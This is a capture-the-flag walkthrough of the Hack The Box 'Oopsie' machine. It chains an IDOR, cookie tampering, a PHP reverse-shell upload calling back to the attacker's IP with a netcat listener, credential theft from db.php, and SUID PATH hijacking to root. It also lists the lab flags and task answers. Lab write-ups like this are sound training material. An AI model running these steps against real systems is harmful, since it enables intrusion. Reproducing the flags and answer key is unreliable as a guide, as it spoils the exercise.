# HTB Oopsie - Complete Notes

## Machine Info
- **Name:** Oopsie
- **Difficulty:** Very Easy
- **OS:** Linux
- **Target IP:** 10.129.150.220
- **Your VPN IP:** 10.10.14.222

═══════════════════════════════════════════════════════════════════════════════

## 1. Enumeration (Nmap)

```bash
sudo nmap -sC -sV 10.129.150.220
```

**Open Ports:**
| Port | Service | Version |
|------|---------|---------|
| 22   | SSH     | OpenSSH 7.6p1 Ubuntu |
| 80   | HTTP    | Apache 2.4.29 Ubuntu |

═══════════════════════════════════════════════════════════════════════════════

## 2. Web Enumeration

### Directory Scan (Gobuster)
```bash
gobuster dir -u http://10.129.150.220/ -w /usr/share/wordlists/dirb/common.txt
```

**Found:**
- `/cdn-cgi/login/` — Login page
- `/uploads/` — File uploads directory
- `/css/`, `/js/`, `/images/`, `/themes/` — Static assets

### Homepage
- Email found: `admin@megacorp.com`
- Hint: Services accessible after logging in

═══════════════════════════════════════════════════════════════════════════════

## 3. Login Page & Guest Access

**URL:** `http://10.129.150.220/cdn-cgi/login/`

### Login as Guest
- Click "Login as Guest" or access:
```bash
curl -s "http://10.129.150.220/cdn-cgi/login/admin.php?content=uploads"      -H "Cookie: user=2233; role=guest"
```

### Cookie Inspection (Firefox Dev Tools)
- Right-click → Inspect Element → Storage → Cookies
- Found: `user=2233`, `role=guest`

═══════════════════════════════════════════════════════════════════════════════

## 4. IDOR Vulnerability (Information Disclosure)

### Finding Admin ID
**URL pattern:** `admin.php?content=accounts&id=2`

**Change id parameter:**
```bash
curl -s "http://10.129.150.220/cdn-cgi/login/admin.php?content=accounts&id=1"
```

**Result:**
| Access ID | Name | Email |
|-----------|------|-------|
| 34322 | admin | admin@megacorp.com |
| 8832 | john | john@tafcz.co.uk |
| 57633 | Peter | peter@qpic.co.uk |
| 28832 | Rafol | tom@rafol.co.uk |
| 86575 | super admin | superadmin@megacorp.com |

**Super Admin ID:** `86575`

═══════════════════════════════════════════════════════════════════════════════

## 5. Cookie Manipulation (Broken Access Control)

### Change Cookies to Super Admin
- `user=86575`
- `role=super admin`

### Methods:
**Method 1: Browser Dev Tools**
- Firefox: Storage → Cookies → Modify values

**Method 2: Burp Suite**
- Intercept request
- Modify Cookie header: `Cookie: user=86575; role=super admin`
- Add Match & Replace rule for persistent access

**Method 3: curl**
```bash
curl -s "http://10.129.150.220/cdn-cgi/login/admin.php?content=uploads"      -H "Cookie: user=86575; role=super admin"
```

**Result:** Access to Uploads page!

═══════════════════════════════════════════════════════════════════════════════

## 6. File Upload & Reverse Shell

### Step 1: Prepare PHP Reverse Shell
```bash
cp /usr/share/webshells/php/php-reverse-shell.php ~/rev.php
nano ~/rev.php
```

**Edit these lines:**
```php
$ip = '10.10.14.222';   // YOUR VPN IP
$port = 1234;            // Your listener port
```

### Step 2: Start Netcat Listener
```bash
sudo nc -lvnp 1234
```

### Step 3: Upload Shell
- Go to Uploads page (as super admin)
- Select `rev.php`
- Upload

### Step 4: Trigger Shell
```bash
curl http://10.129.150.220/uploads/rev.php
```

**Or visit in browser:**
```
http://10.129.150.220/uploads/rev.php
```

### Step 5: Upgrade Shell
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Press Ctrl+Z
```

**On Kali:**
```bash
stty raw -echo; fg
```

**Back in shell:**
```bash
export TERM=xterm
```

═══════════════════════════════════════════════════════════════════════════════

## 7. Post-Exploitation (www-data)

### Find User Credentials
```bash
cat /var/www/html/cdn-cgi/login/db.php
```

**Result:**
```php
<?php
$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
?>
```

**Credentials:**
- **Username:** robert
- **Password:** M3g4C0rpUs3r!

═══════════════════════════════════════════════════════════════════════════════

## 8. SSH as Robert

```bash
ssh robert@10.129.150.220
# Password: M3g4C0rpUs3r!
```

### User Flag
```bash
cat /home/robert/user.txt
```

**User Flag:** `f2c74ee8db7983851ab2a96a44eb7981`

═══════════════════════════════════════════════════════════════════════════════

## 9. Privilege Escalation

### Step 1: Check Groups
```bash
id
```

**Output:**
```
uid=1000(robert) gid=1000(robert) groups=1000(robert),1001(bugtracker)
```

**Key:** robert is in `bugtracker` group

### Step 2: Find bugtracker Files
```bash
find / -group bugtracker 2>/dev/null
```

**Result:** `/usr/bin/bugtracker`

### Step 3: Check SUID Binary
```bash
ls -la /usr/bin/bugtracker
```

**Output:**
```
-rwsr-xr-- 1 root bugtracker 8792 Jan 25  2020 /usr/bin/bugtracker
```

**Key findings:**
- **SUID bit set** (`s` in permissions)
- **Owned by root**
- **Group: bugtracker** (robert is member)

### Step 4: Analyze Binary
```bash
strings /usr/bin/bugtracker
```

**Found:** `cat /root/reports/` — uses relative path for `cat`

### Step 5: Exploit PATH Hijacking

**Vulnerability:** Binary calls `cat` without full path (`/bin/cat`)
**Exploit:** Create fake `cat` that spawns root shell

```bash
cd /tmp
echo '/bin/sh' > cat
chmod +x cat
export PATH=/tmp:$PATH
/usr/bin/bugtracker
# When asked for Bug ID, type anything
```

**Result:** Root shell!

### Alternative: Direct File Read
Since SUID binary runs as root, you can directly read root flag:
```bash
/usr/bin/bugtracker
# Provide Bug ID: ../root.txt
```

**Output:** `af13b0bee69f8a877c3faf667f7beacf`

═══════════════════════════════════════════════════════════════════════════════

## 10. Root Flag

```bash
cat /root/root.txt
```

**Root Flag:** `af13b0bee69f8a877c3faf667f7beacf`

═══════════════════════════════════════════════════════════════════════════════

## Key Vulnerabilities Learned

| Vulnerability | How It Was Exploited | Impact |
|-------------|---------------------|--------|
| **IDOR** | Changed `id` parameter in URL | Information disclosure |
| **Broken Access Control** | Modified cookies to escalate privileges | Super admin access |
| **Unrestricted File Upload** | Uploaded PHP reverse shell | Remote code execution |
| **SUID Binary** | `bugtracker` runs as root | Privilege escalation |
| **PATH Hijacking** | Binary uses relative `cat` path | Arbitrary code execution as root |

═══════════════════════════════════════════════════════════════════════════════

## Tools Used

- nmap
- gobuster
- curl
- Burp Suite (optional)
- netcat (nc)
- ssh
- strings
- find

═══════════════════════════════════════════════════════════════════════════════

## Lessons Learned

1. **Always check for guest/login options** — may bypass authentication
2. **Inspect cookies and session tokens** — access control relies on them
3. **Test for IDOR** — change numeric IDs in URLs
4. **File uploads need restrictions** — block executable file types
5. **SUID binaries are dangerous** — especially with relative paths
6. **PATH hijacking** — classic Linux privesc technique
7. **Use full paths in scripts** — `/bin/cat` not `cat`

═══════════════════════════════════════════════════════════════════════════════

## HTB Task Answers

| Task | Answer |
|------|--------|
| Task 1 | proxy |
| Task 2 | cdn-cgi/login |
| Task 3 | Check cookies after guest login |
| Task 4 | IDOR in id parameter |
| Task 5 | Super admin ID: 86575 |
| Task 6 | Cookie manipulation |
| Task 7 | Upload PHP reverse shell |
| Task 8 | /uploads/ directory |
| Task 9 | Find password in db.php |
| Task 10 | SUID binary exploitation |

═══════════════════════════════════════════════════════════════════════════════
